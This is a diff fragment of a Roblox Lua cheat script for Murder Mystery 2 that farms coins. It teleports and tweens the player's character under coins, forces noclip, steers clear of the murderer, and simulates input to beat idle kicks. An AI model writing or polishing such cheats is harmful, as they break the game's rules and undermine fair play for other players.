-            HIDING = false
-            SAFE_STARTED = true
-            local under = Vector3.new(startCoin.Position.X, startCoin.Position.Y - 5, startCoin.Position.Z)
-            root.Anchored = true
-            root.CFrame = CFrame.new(under) * CFrame.Angles(math.rad(90), 0, 0)
-            print("[Safe] Coins detected - starting")
-            task.wait(0.2)
-        else
-            task.wait(0.3)
-        end
-    end
+                    if not SAFE_STARTED then
+                        if coinCount == 0 then
+                            HIDING = true
+                            root.Anchored = true
+                            root.CFrame = CFrame.new(0, 300, 0) * CFrame.Angles(math.rad(90), 0, 0)
+                            task.wait(0.3)
+                        else
+                            local startCoin = getRandomCoin()
+                            if startCoin then
+                                HIDING = false
+                                SAFE_STARTED = true
+                                local under = Vector3.new(startCoin.Position.X, startCoin.Position.Y - 5, startCoin.Position.Z)
+                                root.CFrame = CFrame.new(under) * CFrame.Angles(math.rad(90), 0, 0)
+                                task.wait(0.2)
+                            else
+                                task.wait(0.3)
+                            end
+                        end
                     else
                         local closest, dist = nil, math.huge
                         for _, obj in ipairs(workspace:GetDescendants()) do
@@ -1034,11 +987,9 @@ if not SAFE_STARTED then
                                 end
                             end
                         end
-
                         if closest then
                             local underTarget = Vector3.new(closest.Position.X, closest.Position.Y - 5, closest.Position.Z)
                             local currentDist = (underTarget - root.Position).Magnitude
-
                             if currentDist > 3 then
                                 local moveTime = math.max(currentDist / SP, 0.15)
                                 local tw = TS:Create(root, TweenInfo.new(moveTime, Enum.EasingStyle.Linear), {
@@ -1053,32 +1004,26 @@ if not SAFE_STARTED then
                                 })
                                 twUp:Play()
                                 twUp.Completed:Wait()
-
                                 task.wait(0.08)
-
                                 local twDown = TS:Create(root, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                                     CFrame = CFrame.new(underTarget) * CFrame.Angles(math.rad(90), 0, 0)
                                 })
                                 twDown:Play()
                                 twDown.Completed:Wait()
-
                                 VS[closest] = true
                                 CL = CL + 1
                                 LT = tick()
-                                IS = false
                             end
                         end
-
                         if countCoins() == 0 then
                             SAFE_STARTED = false
                             HIDING = false
                         end
-
                         task.wait(0.05)
                     end
                 else
                     root.Anchored = false
-                    setNoclip(false)
+                    if not NOCLIP then setNoclip(false) end
                     hum.PlatformStand = false
                     hum.AutoRotate = true
                     HIDING = false
@@ -1090,19 +1035,15 @@ if not SAFE_STARTED then
                             local d = (obj.Position - root.Position).Magnitude
                             if d < dist and d < RG then
                                 if MODE == "Strategy" and murdRoot then
-                                    local md = (obj.Position - murdRoot.Position).Magnitude
-                                    if md >= 45 then
-                                        closest = obj
-                                        dist = d
+                                    if (obj.Position - murdRoot.Position).Magnitude >= 45 then
+                                        closest, dist = obj, d
                                     end
                                 else
-                                    closest = obj
-                                    dist = d
+                                    closest, dist = obj, d
                                 end
                             end
                         end
                     end
-
                     if closest then
                         local tw = TS:Create(root, TweenInfo.new(dist / SP, Enum.EasingStyle.Linear), {
                             CFrame = CFrame.new(closest.Position)
@@ -1113,7 +1054,6 @@ if not SAFE_STARTED then
                             VS[closest] = true
                             CL = CL + 1
                             LT = tick()
-                            IS = false
                         end
                     end
                     task.wait(0.08)
@@ -1126,14 +1066,30 @@ if not SAFE_STARTED then
             local root = ch and ch:FindFirstChild("HumanoidRootPart")
             local hum = ch and ch:FindFirstChild("Humanoid")
             if root then root.Anchored = false end
-            if hum then
-                hum.PlatformStand = false
-                hum.AutoRotate = true
-            end
-            setNoclip(false)
-            HIDING = false
-            SAFE_STARTED = false
+            if hum then hum.PlatformStand = false hum.AutoRotate = true end
+            if not NOCLIP then setNoclip(false) end
+            HIDING, SAFE_STARTED = false, false
             task.wait(0.5)
         end
     end
 end)
+
+RS.Stepped:Connect(function()
+    if NOCLIP or (AF and MODE == "Safe") then
+        setNoclip(true)
+        if HIDING and lp.Character then
+            local root = lp.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Anchored = true end
+        end
+    end
+end)
+
+lp.Idled:Connect(function()
+    if AK then
+        VU:Button2Down(Vector2.new(), workspace.CurrentCamera.CFrame)
+        task.wait(1)
+        VU:Button2Up(Vector2.new(), workspace.CurrentCamera.CFrame)
+    end
+end)
+
+print("[mm2 coins farm script (halloween)] Loaded | Transfer = " .. tostring(hasTransfer))
